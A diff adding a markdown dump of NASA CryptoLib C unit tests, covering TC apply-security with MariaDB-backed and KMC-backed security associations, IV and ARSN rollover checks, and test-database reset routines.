+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(4, &test_association);
+//     for (int i = 0; i < test_association->iv_len; i++)
+//     {
+//         printf("[%d] Truth: %02x, Actual: %02x\n", i, expected_iv_b[i], *(test_association->iv + i));
+//         ASSERT_EQ(expected_iv_b[i], *(test_association->iv + i));
+//     }
+
+//     Crypto_Shutdown();
+//     cleanup_sa(test_association);
+//     free(expected_iv_b);
+//     free(new_iv_b);
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Authorized Encryption With Partial IV Rollover, Static IV
+//  **/
+// UTEST(MARIA_DB, HAPPY_PATH_APPLY_STATIC_IV_ROLLOVER)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_h = "20030815000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+
+//     char* new_iv_h = "FFFFFFFFFFFC";
+//     char* new_iv_b = NULL;
+
+//     char* expected_iv_h = "000000000000000000000001";
+//     char* expected_iv_b = NULL;
+
+//     int raw_tc_sdls_ping_len = 0;
+//     int new_iv_len = 0;
+//     int expected_iv_len = 0;
+
+//     SaInterface sa_if = get_sa_interface_mariadb();
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+//     hex_conversion(new_iv_h, &new_iv_b, &new_iv_len);
+//     hex_conversion(expected_iv_h, &expected_iv_b, &expected_iv_len);
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = CRYPTO_LIB_ERROR;
+
+//     SecurityAssociation_t* test_association;
+
+//     sa_if->sa_get_from_spi(4, &test_association);
+//     memcpy(test_association->iv, new_iv_b, new_iv_len);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(4, &test_association);
+//     for (int i = 0; i < test_association->iv_len; i++)
+//     {
+//         printf("[%d] Truth: %02x, Actual: %02x\n", i, expected_iv_b[i], *(test_association->iv + i));
+//         ASSERT_EQ(expected_iv_b[i], *(test_association->iv + i));
+//     }
+
+//     Crypto_Shutdown();
+//     cleanup_sa(test_association);
+//     free(expected_iv_b);
+//     free(new_iv_b);
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Authorized Encryption With Partial ARSN Rollover, increment static ARSN
+//  **/
+// UTEST(MARIA_DB, HAPPY_PATH_APPLY_NONTRANSMITTED_INCREMENTING_ARSN_ROLLOVER)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_h = "20030C15000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+
+//     char* new_arsn_h = "05FFFC";
+//     char* new_arsn_b = NULL;
+
+//     char* expected_arsn_h = "060001";
+//     char* expected_arsn_b = NULL;
+
+//     int raw_tc_sdls_ping_len = 0;
+//     int new_arsn_len = 0;
+//     int expected_arsn_len = 0;
+
+//     SaInterface sa_if = get_sa_interface_mariadb();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+//     hex_conversion(new_arsn_h, &new_arsn_b, &new_arsn_len);
+//     hex_conversion(expected_arsn_h, &expected_arsn_b, &expected_arsn_len);
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = CRYPTO_LIB_ERROR;
+
+//     SecurityAssociation_t* test_association;
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(5, &test_association);
+
+//     return_val =
+//             Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame,
+//             &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS,return_val);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(5, &test_association);
+//     return_val =
+//             Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame,
+//             &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS,return_val);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(5, &test_association);
+//     return_val =
+//             Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame,
+//             &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS,return_val);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(5, &test_association);
+//     return_val =
+//             Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame,
+//             &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS,return_val);
+//     free(ptr_enc_frame);
+//     ptr_enc_frame = NULL;
+//     cleanup_sa(test_association);
+//     sa_if->sa_get_from_spi(5, &test_association);
+//     return_val =
+//             Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame,
+//             &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS,return_val);
+
+//     cleanup_sa(test_association);
+
+//     printf("Expected ARSN:\n");
+//     Crypto_hexprint(expected_arsn_b,expected_arsn_len);
+//     printf("Actual SA ARSN:\n");
+//     sa_if->sa_get_from_spi(5, &test_association);
+//     Crypto_hexprint(test_association->arsn,test_association->arsn_len);
+
+//     for (int i = 0; i < test_association->arsn_len; i++)
+//     {
+//         printf("[%d] Truth: %02x, Actual: %02x\n", i, expected_arsn_b[i], *(test_association->arsn + i));
+//         ASSERT_EQ(expected_arsn_b[i], *(test_association->arsn + i));
+//     }
+
+//     //Must shutdown after checking test_association ARSN since that will get freed!
+
+//     cleanup_sa(test_association);
+//     free(expected_arsn_b);
+//     free(new_arsn_b);
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+// }
+
+// /**
+//  * @brief Unit Test: Bad Spacecraft ID
+//  * This should pass the flawed hex string, and return CRYPTO_LIB_ERR_INVALID_SCID
+//  * Bad Space Craft ID.  This should pass the flawed .dat file, and return MANAGED_PARAMETERS_FOR_GVCID_NOT_FOUND
+//  **/
+// UTEST(MARIA_DB, BAD_SPACE_CRAFT_ID)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_bad_scid_h = "20010015000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_bad_scid_b = NULL;
+//     int raw_tc_sdls_ping_bad_scid_len = 0;
+
+//     hex_conversion(raw_tc_sdls_ping_bad_scid_h, &raw_tc_sdls_ping_bad_scid_b, &raw_tc_sdls_ping_bad_scid_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_bad_scid_b,
+//     raw_tc_sdls_ping_bad_scid_len,
+//                                                  &ptr_enc_frame, &enc_frame_len);
+//     free(raw_tc_sdls_ping_bad_scid_b);
+//     free(ptr_enc_frame);
+//     Crypto_Shutdown();
+//     ASSERT_EQ(MANAGED_PARAMETERS_FOR_GVCID_NOT_FOUND, return_val);
+// }
+UTEST_MAIN();
+```
+
+### `ut_tc_kmc.c`
+
+**경로:** `components/cryptolib/test/kmc/ut_tc_kmc.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of TC Functionality with KMC Service.
+ **/
+
+#include "ut_tc_apply.h"
+#include "ut_tc_process.h"
+#include "crypto.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include <mysql/mysql.h>
+#include <stdlib.h>
+
+#define KMC_HOSTNAME           "itc.kmc.nasa.gov"
+#define CA_PATH                "/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-ca-bundle.crt"
+#define CLIENT_CERTIFICATE     "/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-cert.pem"
+#define CLIENT_CERTIFICATE_KEY "/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-key.pem"
+
+/**
+ * @brief Error Function for MDB_DB_RESET
+ *
+ * @param con
+ */
+void finish_with_error(MYSQL *con)
+{
+    fprintf(stderr, "%s\n", mysql_error(con));
+    mysql_close(con);
+    exit(1);
+}
+
+void reload_db(void)
+{
+    printf("Resetting Database\n");
+    system("mysql --host=itc.kmc.nasa.gov -u cryptosvc "
+           "--ssl-ca=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-ca-bundle.crt  --ssl-verify-server-cert "
+           "--ssl-cert=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-cert.pem "
+           "--ssl-key=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-key.pem < "
+           "src/sa/sadb_mariadb_sql/empty_sadb.sql");
+    printf("first call done\n");
+    system("mysql --host=itc.kmc.nasa.gov -u cryptosvc "
+           "--ssl-ca=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-ca-bundle.crt  --ssl-verify-server-cert "
+           "--ssl-cert=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-cert.pem "
+           "--ssl-key=/home/itc/Desktop/kmc_oci-3.5.0/files/tls/ammos-server-key.pem < "
+           "src/sa/test_sadb_mariadb_sql/create_sadb_ivv_unit_tests.sql");
+}
+
+/**
+ * @brief MariaDB: Table Cleanup for Unit Tests
+ * Be sure to use only after initialization
+ * TODO: Move to shared function for all Unit Tests
+ */
+void MDB_DB_RESET()
+{
+    MYSQL *con = mysql_init(NULL);
+    if (sa_mariadb_config->mysql_mtls_key != NULL)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_KEY, sa_mariadb_config->mysql_mtls_key);
+    }
+    if (sa_mariadb_config->mysql_mtls_cert != NULL)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_CERT, sa_mariadb_config->mysql_mtls_cert);
+    }
+    if (sa_mariadb_config->mysql_mtls_ca != NULL)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_CA, sa_mariadb_config->mysql_mtls_ca);
+    }
+    if (sa_mariadb_config->mysql_mtls_capath != NULL)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_CAPATH, sa_mariadb_config->mysql_mtls_capath);
+    }
+    if (sa_mariadb_config->mysql_tls_verify_server != CRYPTO_FALSE)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_VERIFY_SERVER_CERT, &(sa_mariadb_config->mysql_tls_verify_server));
+    }
+    if (sa_mariadb_config->mysql_mtls_client_key_password != NULL)
+    {
+        mysql_optionsv(con, MARIADB_OPT_TLS_PASSPHRASE, sa_mariadb_config->mysql_mtls_client_key_password);
+    }
+    if (sa_mariadb_config->mysql_require_secure_transport == CRYPTO_TRUE)
+    {
+        mysql_optionsv(con, MYSQL_OPT_SSL_ENFORCE, &(sa_mariadb_config->mysql_require_secure_transport));
+    }
+    // if encrypted connection (TLS) connection. No need for SSL Key
+    if (mysql_real_connect(con, sa_mariadb_config->mysql_hostname, sa_mariadb_config->mysql_username,
+                           sa_mariadb_config->mysql_password, sa_mariadb_config->mysql_database,
+                           sa_mariadb_config->mysql_port, NULL, 0) == NULL)
+    {
+        // 0,NULL,0 are port number, unix socket, client flag
+        finish_with_error(con);
+    }
+
+    printf("Truncating Tables\n");
+    char *query = "TRUNCATE TABLE security_associations\n";
+    if (mysql_real_query(con, query, strlen(query)))
+    { // query should be NUL terminated!
+        printf("Failed to Truncate Table\n");
+        finish_with_error(con);
+    }
+    query =
+        "INSERT INTO security_associations "
+        "(spi,ekid,sa_state,ecs,est,ast,shivf_len,iv_len,stmacf_len,iv,abm_len,abm,arsnw,arsn_len,tfvn,scid,vcid,mapid,"
+        "ecs_len, shplf_len) VALUES "
+        "(11,'kmc/test/"
+        "key130',3,X'02',1,0,16,16,0,X'00000000000000000000000000000001',1024,X'"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+        "00000000000000000000000000000000000000000000000000000000000000000000',5,0,0,3,0,0,1,1)";
+    if (mysql_real_query(con, query, strlen(query)))
+    { // query should be NUL terminated!
+        printf("Failed to re-create security_association table for SPI 11\n");
+        finish_with_error(con);
+    }
+}
+
+/**
+ * @brief Unit Test: Nominal Encryption CBC KMC
+ **/
+UTEST(TC_APPLY_SECURITY, HAPPY_PATH_ENC_CBC_KMC)
+{
+    reload_db();
+    // Setup & Initialize CryptoLib
+    Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+                            IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+    Crypto_Config_MariaDB(KMC_HOSTNAME, "sadb", 3306, CRYPTO_TRUE, CRYPTO_TRUE, CA_PATH, NULL, CLIENT_CERTIFICATE,
+                          CLIENT_CERTIFICATE_KEY, NULL, "root", "changeit");
+    Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443, "crypto-service", "/certs/ammos-ca-bundle.crt",
+                                     NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL);
+    GvcidManagedParameters_t TC_UT_Managed_Parameters0 = {
+        0, 0x0003, 0, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, AOS_NO_OCF, 1};
+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters0);
+    GvcidManagedParameters_t TC_UT_Managed_Parameters1 = {
+        0, 0x0003, 1, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, AOS_NO_OCF, 1};
+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters1);
+    GvcidManagedParameters_t TC_UT_Managed_Parameters2 = {
+        0, 0x0003, 2, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, AOS_NO_OCF, 1};
+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters2);
+    GvcidManagedParameters_t TC_UT_Managed_Parameters3 = {
+        0, 0x0003, 3, TC_HAS_FECF, AOS_FHEC_NA, AOS_IZ_NA, 0, TC_HAS_SEGMENT_HDRS, 1024, AOS_NO_OCF, 1};
+    Crypto_Config_Add_Gvcid_Managed_Parameters(TC_UT_Managed_Parameters3);
+    // Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+    // AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024,
+    // AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 2, TC_HAS_FECF,
+    // TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3,
+    // TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+    int32_t return_val = Crypto_Init();
+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+    char *raw_tc_sdls_ping_h   = "20030015000080d2c70008197f0b00310000b1fe3128";
+    char *raw_tc_sdls_ping_b   = NULL;
+    int   raw_tc_sdls_ping_len = 0;
+    // SaInterface sa_if = get_sa_interface_inmemory();
+
+    hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+    uint8_t *ptr_enc_frame = NULL;
+    uint16_t enc_frame_len = 0;
+
+    // SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+    // Expose the SADB Security Association for test edits.
+    // sa_if->sa_get_from_spi(1, &test_association);
+    // test_association->sa_state = SA_NONE;
+    // sa_if->sa_get_from_spi(11, &test_association);
+    // test_association->arsn_len = 0;
+    // test_association->shsnf_len = 0;
+    // test_association->ast = 0;
+    // test_association->stmacf_len = 0;
+    // test_association->sa_state = SA_OPERATIONAL;
+    // sa_if->sa_get_from_spi(11, &test_association);
+    return_val =
+        Crypto_TC_ApplySecurity((uint8_t *)raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+    char    *truth_data_h = "2003002A0000000B00000000000000000000000000000000025364F9BC3344AF359DA06CA886746F59A0AB";
+    uint8_t *truth_data_b = NULL;
+    int      truth_data_l = 0;
+
+    hex_conversion(truth_data_h, (char **)&truth_data_b, &truth_data_l);
+    // printf("Encrypted Frame:\n");
+    for (int i = 0; i < enc_frame_len; i++)
+    {
+        // printf("%02x -> %02x ", ptr_enc_frame[i], truth_data_b[i]);
+        ASSERT_EQ(ptr_enc_frame[i], truth_data_b[i]);
+    }
+    // printf("\n");
+
+    Crypto_Shutdown();
+    free(raw_tc_sdls_ping_b);
+    free(ptr_enc_frame);
+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+}
+
+// /**
+//  * @brief Unit Test: Encryption CBC KMC 1 Byte of padding
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_KMC_1BP)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20030016000080d2c70008197f0b0031000000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     printf("SPI: %d\n", test_association->spi);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     char* truth_data_h = "2003002A0000000B00000000000000000000000000000000011C1741A95DE7EF6FCF2B20B6F09E9FD29988";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char **)&truth_data_b, &truth_data_l);
+//     //printf("Encrypted Frame:\n");
